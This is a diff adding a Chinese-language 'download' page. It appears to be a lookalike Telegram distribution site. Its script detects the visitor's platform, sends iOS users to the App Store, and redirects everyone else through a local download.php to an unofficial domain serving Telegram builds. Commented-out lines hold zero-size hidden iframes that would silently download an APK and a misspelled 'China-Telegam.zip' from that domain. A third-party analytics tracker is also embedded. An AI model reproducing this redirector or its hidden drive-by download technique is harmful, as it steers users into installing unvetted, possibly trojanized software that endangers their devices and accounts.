@@ -1,0 +1,59 @@
+<html>  
+    <head>  
+	<meta name="robots” content="nofollow” />
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />  
+        <title>下载</title>
+        <script type="text/javascript">  
+            var browser = {  
+                versions: function() {  
+                    var u = navigator.userAgent, app = navigator.appVersion;  
+                    return { 
+                        trident: u.indexOf('Trident') > -1,
+                        presto: u.indexOf('Presto') > -1,
+                        webKit: u.indexOf('AppleWebKit') > -1,  
+                        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, 
+                        mobile: !!u.match(/AppleWebKit.*Mobile.*/) || !!u.match(/AppleWebKit/),  
+                        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),   
+                        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1,
+                        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1,
+                        iPad: u.indexOf('iPad') > -1, 
+                        webApp: u.indexOf('Safari') == -1 
+                    };  
+                }(),  
+                language: (navigator.browserLanguage || navigator.language).toLowerCase()  
+            }  
+   
+            if (browser.versions.ios || browser.versions.iPhone || browser.versions.iPad) {
+			    window.location="https://apps.apple.com/app/telegram-messenger/id686449807";  //跳转
+                //document.write("<iframe width='0' height='0' src='https://ken.com.kenfw.com/HaAcP'></iframe>");//下载
+            }  
+            else if (browser.versions.android) { 
+			    window.location="/download.php?url=https://downloadtgapp.com/download/telegram-os/download.html";//跳转
+                //document.write("<iframe width='0' height='0' src='https://downloadtgapp.com/Telegram.apk'></iframe>");//下载
+            }  
+			else {  
+			    window.location="/download.php?url=https://downloadtgapp.com/download/telegram-os/download.html";//跳转
+			    //document.write("<iframe width='0' height='0' src='https://downloadtgapp.com/China-Telegam.zip'></iframe>");//下载
+            }    
+    
+
+        </script>  
+		
+    </head>  
+    <body>  
+<!-- Matomo -->
+<script>
+  var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="https://web.dcobxs.com/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '2']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<!-- End Matomo Code -->
+    </body>  
